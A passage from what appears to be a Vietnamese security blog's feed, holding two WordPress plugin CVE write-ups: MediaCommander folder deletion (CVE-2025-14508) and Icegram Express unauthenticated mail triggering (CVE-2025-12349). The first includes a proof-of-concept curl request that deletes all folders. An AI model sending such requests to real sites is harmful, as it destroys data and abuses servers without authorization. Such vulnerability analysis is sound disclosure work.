executes&amp;#34;]&#xA;D -- No --&amp;gt; Z[&amp;#34;403 Forbidden&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Read CSV file and parameters (clear, attachments)&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;clear == true?&amp;#34;}&#xA;G -- Yes --&amp;gt; H[&amp;#34;Delete all existing folders&amp;#34;]&#xA;H --&amp;gt; K[&amp;#34;Broken Access Control: destructive action allowed for Author&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login bằng Author account&lt;/li&gt;&#xA;&lt;li&gt;Lấy &lt;code&gt;nonce&lt;/code&gt; từ response trả về:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/nonce.png&#34; title=&#34;Nonce trong response&#34; data-thumbnail=&#34;/posts/2025-12-15-cve-2025-14508/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce trong response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-15-cve-2025-14508/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;310&#34; width=&#34;926&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce trong response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Gửi request với header &lt;code&gt;X-WP-Nonce&lt;/code&gt; là giá trị &lt;code&gt;nonce&lt;/code&gt; lấy được từ response:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST &amp;#34;http://localhost/wp-json/mediacommander/v1/import-csv&amp;#34; \&#xA;  -H &amp;#34;Cookie: Author cookie&amp;#34; \&#xA;  -H &amp;#34;X-WP-Nonce: 7323b67e07&amp;#34; \&#xA;  -F &amp;#34;file=@./file.csv&amp;#34; \&#xA;  -F &amp;#34;clear=true&amp;#34; \&#xA;  -F &amp;#34;attachments=false&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng CVE-2025-14508 cho thấy plugin &lt;strong&gt;MediaCommander ≤ 2.3.1&lt;/strong&gt; cho phép người dùng &lt;strong&gt;Author trở lên&lt;/strong&gt; thực hiện thao tác &lt;strong&gt;xóa toàn bộ folder&lt;/strong&gt; của người khác thông qua REST API &lt;code&gt;import-csv&lt;/code&gt;. Nguyên nhân là &lt;strong&gt;thiếu kiểm tra quyền phù hợp&lt;/strong&gt; cho hành động phá hủy dữ liệu. Bản vá &lt;strong&gt;2.4.0&lt;/strong&gt; đã sửa bằng cách nâng quyền kiểm tra lên &lt;strong&gt;Administrator&lt;/strong&gt; (&lt;code&gt;manage_options&lt;/code&gt;), ngăn chặn việc xóa trái phép.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Luôn phân quyền chính xác theo mức độ rủi ro của hành động (destructive actions chỉ dành cho Administrator).&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra capability trong REST API phải phù hợp với tính chất thao tác, không chỉ dựa vào quyền cơ bản như &lt;code&gt;upload_files&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Tham số như &lt;code&gt;clear&lt;/code&gt; có thể gây &lt;strong&gt;mất dữ liệu toàn bộ&lt;/strong&gt;, cần xử lý cẩn trọng và kết hợp kiểm tra quyền.&lt;/li&gt;&#xA;&lt;li&gt;Sử dụng nonce và cookie đúng cách nhưng không thể bù đắp cho &lt;strong&gt;broken access control&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mediacommander/vulnerability/wordpress-mediacommander-plugin-2-3-1-missing-authorization-to-authenticated-author-media-folder-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MediaCommander – Bring Folders to Media, Posts, and Pages Plugin &amp;lt;= 2.3.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12349 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-14-cve-2025-12349/</link>
      <pubDate>Sun, 14 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-14-cve-2025-12349/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-14-cve-2025-12349/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Icegram Express – Email Subscribers, Newsletters and Marketing Automation&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; bị &lt;strong&gt;lỗ hổng Authorization&lt;/strong&gt; trong các phiên bản &lt;strong&gt;từ trước đến và bao gồm 5.9.10&lt;/strong&gt;. Nguyên nhân là do plugin &lt;strong&gt;không xác thực đúng quyền của người dùng&lt;/strong&gt; khi thực hiện hành động trong hàm &lt;strong&gt;&lt;code&gt;trigger_mailing_queue_sending&lt;/code&gt;&lt;/strong&gt;.&#xA;Điều này cho phép &lt;strong&gt;kẻ tấn công không cần xác thực (unauthenticated attackers)&lt;/strong&gt; có thể &lt;strong&gt;ép hệ thống gửi email ngay lập tức&lt;/strong&gt;, &lt;strong&gt;bỏ qua lịch gửi (schedule)&lt;/strong&gt;, &lt;strong&gt;tăng tải máy chủ&lt;/strong&gt;, và &lt;strong&gt;thay đổi trạng thái của plugin&lt;/strong&gt; (ví dụ: &lt;strong&gt;&lt;code&gt;last-cron-hit&lt;/code&gt;&lt;/strong&gt;), từ đó &lt;strong&gt;tạo điều kiện cho hành vi lạm dụng hoặc các hiệu ứng giống DoS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12349&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12349&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.9.10&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.9.11&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/email-subscribers/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Email Subscribers &amp;amp; Newsletters Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Email Subscribers &amp;amp; Newsletters&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.9.10&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.9.11&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký &lt;strong&gt;action hook&lt;/strong&gt; như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;    &amp;#39;wp_ajax_nopriv_ig_es_trigger_mailing_queue_sending&amp;#39;,&#xA;    array( $this, &amp;#39;trigger_mailing_queue_sending&amp;#39; )&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hook &lt;strong&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;&lt;/strong&gt; là cơ chế cho phép &lt;strong&gt;tất cả người dùng&lt;/strong&gt;, bao gồm cả &lt;strong&gt;người dùng chưa đăng nhập&lt;/strong&gt;, truy cập vào &lt;strong&gt;AJAX endpoint&lt;/strong&gt; của WordPress.&lt;/p&gt;&#xA;&lt;p&gt;Vì vậy, khi truy cập endpoint &lt;strong&gt;&lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt;&lt;/strong&gt; với tham số:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=ig_es_trigger_mailing_queue_sending&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress sẽ &lt;strong&gt;gọi trực tiếp callback&lt;/strong&gt; &lt;strong&gt;&lt;code&gt;trigger_mailing_queue_sending&lt;/code&gt;&lt;/strong&gt; mà &lt;strong&gt;không có bất kỳ kiểm tra xác thực hay phân quyền nào&lt;/strong&gt;, dẫn đến việc &lt;strong&gt;bất kỳ ai&lt;/strong&gt; cũng có thể kích hoạt &lt;strong&gt;logic gửi email qua cron&lt;/strong&gt;, &lt;strong&gt;bỏ qua lịch gửi&lt;/strong&gt;, và &lt;strong&gt;làm thay đổi trạng thái nội bộ của plugin&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function trigger_mailing_queue_sending() {&#xA;    // Call cron action only when it is not locked.&#xA;    if ( ! ES()-&amp;gt;cron-&amp;gt;is_locked() ) {&#xA;        // Start processing of campaigns which are scheduled for current date time.&#xA;        do_action( &amp;#39;ig_es_cron_worker&amp;#39; );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;strong&gt;&lt;code&gt;trigger_mailing_queue_sending()&lt;/code&gt;&lt;/strong&gt; có nhiệm vụ &lt;strong&gt;kích hoạt tiến trình cron gửi email&lt;/strong&gt; của plugin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Đầu tiên, hàm kiểm tra trạng thái &lt;strong&gt;lock&lt;/strong&gt; của cron thông qua &lt;strong&gt;&lt;code&gt;ES()-&amp;gt;cron-&amp;gt;is_locked()&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu cron &lt;strong&gt;đang bị khóa&lt;/strong&gt;, hàm sẽ &lt;strong&gt;không thực hiện gì&lt;/strong&gt;, nhằm tránh việc nhiều tiến trình gửi email chạy song song.&lt;/li&gt;&#xA;&lt;li&gt;Nếu cron &lt;strong&gt;chưa bị khóa&lt;/strong&gt;, hàm sẽ gọi &lt;strong&gt;&lt;code&gt;do_action( &#39;ig_es_cron_worker&#39; )&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;2 callback đã được đăng ký cho action hook &lt;code&gt;ig_es_cron_worker&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;ig_es_cron_worker&amp;#39;, array( &amp;amp;$this, &amp;#39;process_campaigns&amp;#39; ), 10 );&#xA;add_action( &amp;#39;ig_es_cron_worker&amp;#39;, array( &amp;amp;$this, &amp;#39;process_queue&amp;#39; ), 30 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hook này sẽ gọi callback theo thứ tự ưu tiên: &lt;code&gt;process_campaigns()&lt;/code&gt; chạy trước và &lt;code&gt;process_queue()&lt;/code&gt; chạy sau&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function process_campaigns() {&#xA;&#xA;    if ( ES()-&amp;gt;cron-&amp;gt;should_unlock() ) {&#xA;        ES()-&amp;gt;cron-&amp;gt;unlock();&#xA;    }&#xA;&#xA;    ES()-&amp;gt;cron-&amp;gt;set_last_hit();&#xA;&#xA;    // ...&#xA;    $es_c_croncount = ES()-&amp;gt;mailer-&amp;gt;get_total_emails_send_now();&#xA;&#xA;    if ( $es_c_croncount &amp;gt; 0 ) {&#xA;&#xA;        // ...&#xA;        $notification = ES_DB_Mailing_Queue::get_notification_to_be_sent( $campaign_hash );&#xA;        $notification_guid = isset( $notification[&amp;#39;hash&amp;#39;] ) ? $notification[&amp;#39;hash&amp;#39;] : null;&#xA;        $campaign_id = isset( $notification[&amp;#39;campaign_id&amp;#39;] ) ? $notification[&amp;#39;campaign_id&amp;#39;] : 0;&#xA;&#xA;        // ...&#xA;&#xA;        if ( ! is_null( $notification_guid ) ) {&#xA;&#xA;            $cron_job = &amp;#39;ig_es_cron_worker&amp;#39;;&#xA;&#xA;            // ...&#xA;            if ( ! $this-&amp;gt;is_cron_job_locked( $cron_job ) ) {&#xA;&#xA;                $locking_status = $this-&amp;gt;lock_cron_job( $cron_job );&#xA;                if ( &amp;#39;locked&amp;#39; === $locking_status ) {&#xA;&#xA;                    // ...&#xA;                    ES_DB_Mailing_Queue::update_sent_status( $notification_guid, &amp;#39;Sending&amp;#39; );&#xA;&#xA;                    // ...&#xA;                    $emails_data = ES_DB_Sending_Queue::get_emails_to_be_sent_by_hash(&#xA;                        $notification_guid,&#xA;                        $es_c_croncount&#xA;                    );&#xA;&#xA;                    if ( count( $emails_data ) &amp;gt; 0 ) {&#xA;&#xA;                        // ...&#xA;                        ES()-&amp;gt;mailer-&amp;gt;send(&#xA;                            $notification[&amp;#39;subject&amp;#39;],&#xA;                            $notification[&amp;#39;body&amp;#39;],&#xA;                            array_column( $emails_data, &amp;#39;email&amp;#39; ),&#xA;                            array( &amp;#39;guid&amp;#39; =&amp;gt; $notification_guid )&#xA;                        );&#xA;&#xA;                        // ...&#xA;                        if ( ES_DB_Sending_Queue::get_total_emails_to_be_sent_by_hash( $notification_guid ) === 0 ) {&#xA;                            ES_DB_Mailing_Queue::update_sent_status( $notification_guid, &amp;#39;Sent&amp;#39; );&#xA;                        }&#xA;&#xA;                        // ...&#xA;                    }&#xA;&#xA;                    $this-&amp;gt;unlock_cron_job( $cron_job );&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Hàm &lt;code&gt;process_campaigns()&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Mở khóa cron nếu cần và cập nhật thời điểm cron chạy.&lt;/li&gt;&#xA;&lt;li&gt;Lấy &lt;strong&gt;giới hạn số email&lt;/strong&gt; có thể gửi trong một lần chạy.&lt;/li&gt;&#xA;&lt;li&gt;Lấy &lt;strong&gt;campaign đang chờ gửi&lt;/strong&gt; từ &lt;code&gt;ig_es_mailing_queue&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra và &lt;strong&gt;lock cron job&lt;/strong&gt; để tránh chạy song song.&lt;/li&gt;&#xA;&lt;li&gt;Chuyển trạng thái campaign sang &lt;strong&gt;&lt;code&gt;Sending&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Lấy danh sách email cần gửi theo &lt;strong&gt;batch size&lt;/strong&gt; từ &lt;code&gt;ig_es_sending_queue&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Thực hiện &lt;strong&gt;gửi email hàng loạt&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu đã gửi hết email, cập nhật trạng thái campaign sang &lt;strong&gt;&lt;code&gt;Sent&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Cuối cùng &lt;strong&gt;unlock cron job&lt;/strong&gt; để các lần chạy sau tiếp tục xử lý.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function process_queue() {&#xA;&#xA;    global $wpdb;&#xA;&#xA;    if ( ES()-&amp;gt;cron-&amp;gt;should_unlock() ) {&#xA;        ES()-&amp;gt;cron-&amp;gt;unlock();&#xA;    }&#xA;&#xA;    ES()-&amp;gt;cron-&amp;gt;set_last_hit();&#xA;&#xA;    $email_sending_limit = ES()-&amp;gt;mailer-&amp;gt;get_total_emails_send_now();&#xA;&#xA;    if ( $email_sending_limit &amp;gt; 0 ) {&#xA;&#xA;        $micro_time = microtime( true );&#xA;&#xA;        ...&#xA;        $notifications = $wpdb-&amp;gt;get_results(&#xA;            ...&#xA;        );&#xA;&#xA;        $batch_start_time = time();&#xA;&#xA;        if ( is_array( $notifications ) &amp;amp;&amp;amp; count( $notifications ) &amp;gt; 0 ) {&#xA;&#xA;            ...&#xA;            $contacts = ES()-&amp;gt;contacts_db-&amp;gt;get_details_by_ids( $contact_ids );&#xA;&#xA;            foreach ( $campaigns_notifications as $campaign_id =&amp;gt; $notifications ) {&#xA;&#xA;                ...&#xA;&#xA;                foreach ( $notifications as $notification ) {&#xA;&#xA;                    ...&#xA;&#xA;                    if ( &amp;#39;optin_confirmation&amp;#39; === $notification_type ) {&#xA;                        ...&#xA;                    } elseif ( &amp;#39;optin_welcome_email&amp;#39; === $notification_type ) {&#xA;                        ...&#xA;                    } else {&#xA;                        ...&#xA;                    }&#xA;&#xA;                    $email_sending_limit--;&#xA;&#xA;                    if ( $email_sent ) {&#xA;                        $this-&amp;gt;db-&amp;gt;delete_from_queue( $campaign_id, $contact_id );&#xA;                    }&#xA;&#xA;                    if (&#xA;                        $email_sending_limit &amp;lt;= 0 ||&#xA;                        IG_ES_Background_Process_Helper::time_exceeded( $batch_start_time, 0.8 ) ||&#xA;                        IG_ES_Background_Process_Helper::memory_exceeded()&#xA;                    ) {&#xA;                        break 2;&#xA;                    }&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Hàm &lt;code&gt;process_queue()&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kiểm tra và mở khóa cron nếu cần, sau đó cập nhật thời điểm cron chạy lần cuối.&lt;/li&gt;&#xA;&lt;li&gt;Xác định số lượng email tối đa có thể gửi trong một lần thực 